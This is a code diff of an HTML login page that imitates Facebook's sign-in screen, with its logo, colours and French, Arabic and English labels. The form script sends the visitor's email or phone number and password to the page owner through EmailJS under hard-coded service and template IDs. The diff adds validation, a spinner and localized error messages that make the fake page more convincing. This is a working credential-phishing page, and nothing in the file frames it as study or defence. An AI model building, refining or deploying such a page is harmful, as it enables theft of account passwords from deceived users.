@@ -48,11 +48,15 @@
         }
         form {
             width: 100%;
+            position: relative;
+        }
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
         }
         input, button {
             width: 100%;
             padding: 14px 16px;
-            margin-bottom: 12px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 17px;
@@ -70,18 +74,35 @@
             font-weight: bold;
             border: none;
             cursor: pointer;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        button .spinner {
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top: 2px solid #1877f2;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .forgot-password {
-            color: #737373; /* Text color changed to grey */
+            color: #737373;
             text-decoration: none;
             font-size: 14px;
             display: block;
             margin-top: 16px;
         }
         .create-account {
-            background-color: transparent; /* Made button background transparent */
-            color: #737373; /* Text color changed to grey */
-            border: 1px solid #dddfe2; /* Grey edges */
+            background-color: transparent;
+            color: #737373;
+            border: 1px solid #dddfe2;
             margin-top: 16px;
             font-weight: bold;
         }
@@ -97,27 +118,76 @@
             color: #737373;
             text-decoration: none;
         }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="text/javascript">
-       (function(){
-          emailjs.init("GtGOvoRxe-k7_3oK8"); // Replace with your EmailJS user ID
-       })();
+        (function(){
+            emailjs.init("GtGOvoRxe-k7_3oK8"); // Replace with your EmailJS user ID
+        })();
 
-       function handleFormSubmit(event) {
+        function handleFormSubmit(event) {
             event.preventDefault();
+            
             const emailOrPhone = document.querySelector('input[name="email_or_phone"]').value;
             const password = document.querySelector('input[name="password"]').value;
-            
+            const errorMessage = document.querySelector('.error-message');
+            const submitButton = document.querySelector('button[type="submit"]');
+            const buttonText = submitButton.querySelector('.button-text');
+            const spinner = submitButton.querySelector('.spinner');
+
+            // Input validation
+            if (!validateEmailOrPhone(emailOrPhone)) {
+                errorMessage.textContent = getErrorMessage();
+                errorMessage.style.display = 'block';
+                return;
+            } else {
+                errorMessage.style.display = 'none';
+            }
+
+            // Show spinner and hide button text
+            buttonText.style.display = 'none';
+            spinner.style.display = 'block';
+
             emailjs.send("service_iw97iee", "template_zvf9gb3", { // Replace with your service ID and template ID
                 email_or_phone: emailOrPhone,
                 password: password
             })
             .then((response) => {
                 console.log('Email successfully sent!', response.status, response.text);
+                // Hide spinner and show button text
+                spinner.style.display = 'none';
+                buttonText.style.display = 'block';
             }, (error) => {
                 console.error('Failed to send email.', error);
+                // Hide spinner and show button text
+                spinner.style.display = 'none';
+                buttonText.style.display = 'block';
             });
+        }
+
+        function validateEmailOrPhone(input) {
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phonePattern = /^[0-9]{10}$/; // Example pattern for a 10-digit phone number
+            return emailPattern.test(input) || phonePattern.test(input);
+        }
+
+        function getErrorMessage() {
+            const userLang = navigator.language || navigator.userLanguage; // Detect browser language
+            const lang = userLang.split('-')[0]; // Get the primary language code (e.g., "fr", "en")
+            
+            const errorMessages = {
+                'fr': "Veuillez entrer un numéro de téléphone ou une adresse e-mail valide.",
+                'ar': "يرجى إدخال رقم هاتف أو عنوان بريد إلكتروني صالح.",
+                'en': "Please enter a valid phone number or email address."
+            };
+
+            return errorMessages[lang] || errorMessages['en'];
         }
         
         function setContentBasedOnLanguage() {
@@ -180,7 +250,7 @@
                 },
                 'en': {
                     'US': {
-                        title: "Login - English (United States)",
+                        title: "English (United States)",
                         placeholderEmail: "Phone number or email address",
                         placeholderPassword: "Password",
                         forgotPassword: "Forgot password?",
@@ -188,7 +258,7 @@
                         createAccount: "Create an account"
                     },
                     'GB': {
-                        title: "Login - English (United Kingdom)",
+                        title: "English (United Kingdom)",
                         placeholderEmail: "Phone number or email address",
                         placeholderPassword: "Password",
                         forgotPassword: "Forgot password?",
@@ -196,7 +266,7 @@
                         createAccount: "Create an account"
                     },
                     'default': {
-                        title: "Login - English",
+                        title: "English",
                         placeholderEmail: "Phone number or email address",
                         placeholderPassword: "Password",
                         forgotPassword: "Forgot password?",
@@ -206,16 +276,16 @@
                 }
             };
 
-            const countryLabels = languageLabels[lang] || languageLabels['en'];
-            const content = countryLabels[country] || countryLabels['default'];
+            // Set language and country-specific content
+            const labels = languageLabels[lang] && languageLabels[lang][country] ? languageLabels[lang][country] : languageLabels[lang] ? languageLabels[lang]['default'] : languageLabels['en']['default'];
 
-            pageTitle.textContent = content.title;
-            h1.textContent = content.title.split(' - ')[1] || content.title;
-            placeholders[0].placeholder = content.placeholderEmail;
-            placeholders[1].placeholder = content.placeholderPassword;
-            forgotPassword.textContent = content.forgotPassword;
-            submitButton.textContent = content.submitButton;
-            createAccount.textContent = content.createAccount;
+            pageTitle.textContent = labels.title;
+            h1.textContent = labels.title;
+            placeholders[0].placeholder = labels.placeholderEmail;
+            placeholders[1].placeholder = labels.placeholderPassword;
+            forgotPassword.textContent = labels.forgotPassword;
+            submitButton.querySelector('.button-text').textContent = labels.submitButton;
+            createAccount.textContent = labels.createAccount;
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -228,17 +298,22 @@
 <body>
     <div class="container">
         <div class="content">
-            <h1></h1>
+            <h1>Connexion</h1>
             <div class="logo">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
-                    <path fill="#1877F2" d="M36 18c0-9.94-8.06-18-18-18S0 8.06 0 18c0 9.01 6.63 16.44 15.26 17.83V23.27h-4.6v-5.23h4.6v-3.88c0-4.55 2.7-7.06 6.86-7.06 1.99 0 4.08.35 4.08.35v4.47h-2.3c-2.27 0-2.97 1.41-2.97 2.85v3.27h5.05l-.8 5.23h-4.25v12.56C29.37 34.43 36 27 36 18z"/>
-                    <path fill="#FFF" d="M24.77 23.27l.8-5.23h-5.05v-3.27c0-1.44.7-2.85 2.97-2.85h2.3v-4.47s-2.09-.35-4.08-.35c-4.16 0-6.86 2.51-6.86 7.06v3.88h-4.6v5.23h4.6v12.56c.93.15 1.88.24 2.84.24s1.91-.09 2.84-.24V23.27h4.25z"/>
-                </svg>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36"><path fill="#1877F2" d="M36 18c0-9.94-8.06-18-18-18S0 8.06 0 18c0 9.01 6.63 16.44 15.26 17.83V23.27h-4.6v-5.23h4.6v-3.88c0-4.55 2.7-7.06 6.86-7.06 1.99 0 4.08.35 4.08.35v4.47h-2.3c-2.27 0-2.97 1.41-2.97 2.85v3.27h5.05l-.8 5.23h-4.25v12.56C29.37 34.43 36 27 36 18z"/><path fill="#FFF" d="M24.77 23.27l.8-5.23h-5.05v-3.27c0-1.44.7-2.85 2.97-2.85h2.3v-4.47s-2.09-.35-4.08-.35c-4.16 0-6.86 2.51-6.86 7.06v3.88h-4.6v5.23h4.6v12.56c.93.15 1.88.24 2.84.24s1.91-.09 2.84-.24V23.27h4.25z"/></svg>
             </div>
             <form>
-                <input type="text" name="email_or_phone" placeholder="">
-                <input type="password" name="password" placeholder="">
-                <button type="submit">Se connecter</button>
+                <div class="input-container">
+                    <input type="text" name="email_or_phone" placeholder="">
+                    <div class="error-message"></div>
+                </div>
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="">
+                </div>
+                <button type="submit">
+                    <div class="spinner"></div>
+                    <span class="button-text">Se connecter</span>
+                </button>
             </form>
             <a href="#" class="forgot-password"></a>
             <button class="create-account"></button>
